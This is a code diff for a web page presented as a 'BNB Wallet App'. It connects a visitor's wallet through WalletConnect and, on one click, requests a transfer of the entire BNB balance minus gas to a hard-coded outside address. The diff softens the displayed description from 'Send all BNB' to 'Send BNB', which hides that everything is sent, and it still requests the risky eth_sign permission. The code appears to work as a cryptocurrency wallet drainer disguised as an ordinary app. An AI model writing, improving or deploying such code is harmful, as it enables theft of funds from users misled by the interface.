@@ -1,14 +1,14 @@
 import { ethers } from "ethers";
 import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";
 
-// WalletConnect project ID خودت رو اینجا بذار
-const projectId = "4d08946e6c316bed5e76b450ccbb5256";
+const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // از WalletConnect بگیر
+const TO_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // مقصد ارسال
 
 const modal = new WalletConnectModalSign({
   projectId,
   metadata: {
     name: "BNB Wallet App",
-    description: "Send all BNB using WalletConnect",
+    description: "Send BNB with WalletConnect",
     url: "http://localhost",
     icons: ["https://walletconnect.com/walletconnect-logo.png"],
   },
@@ -36,14 +36,15 @@ const sendBtn = document.getElementById("sendBtn");
 const addressSpan = document.getElementById("address");
 const balanceSpan = document.getElementById("balance");
 
-let signer;
+let session;
+let userAddress;
 
 connectBtn.addEventListener("click", async () => {
   try {
-    const session = await modal.connect({
+    session = await modal.connect({
       requiredNamespaces: {
         eip155: {
-          methods: ["eth_sendTransaction", "eth_sign", "personal_sign", "eth_signTypedData"],
+          methods: ["eth_sendTransaction", "eth_sign"],
           chains: ["eip155:56"],
           events: ["chainChanged", "accountsChanged"],
         },
@@ -51,48 +52,59 @@ connectBtn.addEventListener("click", async () => {
     });
 
     const account = session.namespaces.eip155.accounts[0];
-    const address = account.split(":")[2];
-    addressSpan.textContent = address;
+    userAddress = account.split(":")[2];
+    addressSpan.textContent = userAddress;
 
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    signer = await provider.getSigner();
-
-    const balance = await provider.getBalance(address);
+    const rpc = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+    const balance = await rpc.getBalance(userAddress);
     const bnb = ethers.formatEther(balance);
-    balanceSpan.textContent = $`{bnb} BNB`;
+    balanceSpan.textContent = `${bnb} BNB`;
 
   } catch (err) {
-    console.error("Connection failed", err);
+    console.error("Connection error:", err);
   }
 });
 
 sendBtn.addEventListener("click", async () => {
-  if (!signer) {
+  if (!session || !userAddress) {
     alert("Please connect your wallet first.");
     return;
   }
 
   try {
-    const sender = await signer.getAddress();
-    const provider = signer.provider;
-    const balance = await provider.getBalance(sender);
+    const rpc = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+    const balance = await rpc.getBalance(userAddress);
 
     const gasLimit = 21000n;
-    const gasPrice = await provider.getFeeData().then(fee => fee.gasPrice || 5n * 10n ** 9n);
+    const gasPrice = await rpc.getFeeData().then(fee => fee.gasPrice || 5n * 10n ** 9n);
     const fee = gasLimit * gasPrice;
     const amountToSend = balance - fee;
 
+    if (amountToSend <= 0n) {
+      alert("Not enough BNB to send.");
+      return;
+    }
+
     const tx = {
-      to: "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05", // <-- آدرس مقصد رو اینجا بذار
-      value: amountToSend,
-      gasLimit,
-      gasPrice
+      from: userAddress,
+      to: TO_ADDRESS,
+      value: ethers.hexlify(amountToSend),
+      gas: ethers.hexlify(gasLimit),
+      gasPrice: ethers.hexlify(gasPrice)
     };
 
-    const txResponse = await signer.sendTransaction(tx);
-    alert(`Transaction sent!\nTx Hash: ${txResponse.hash}`);
+    const result = await modal.request({
+      topic: session.topic,
+      chainId: "eip155:56",
+      request: {
+        method: "eth_sendTransaction",
+        params: [tx],
+      },
+    });
+
+    alert(`Transaction sent!\nTx Hash: ${result}`);
   } catch (err) {
-    console.error("Transaction failed", err);
-    alert("Transaction failed: " + err.message);
+    console.error("Send failed:", err);
+    alert("Transaction failed: " + (err.message || err));
   }
 });
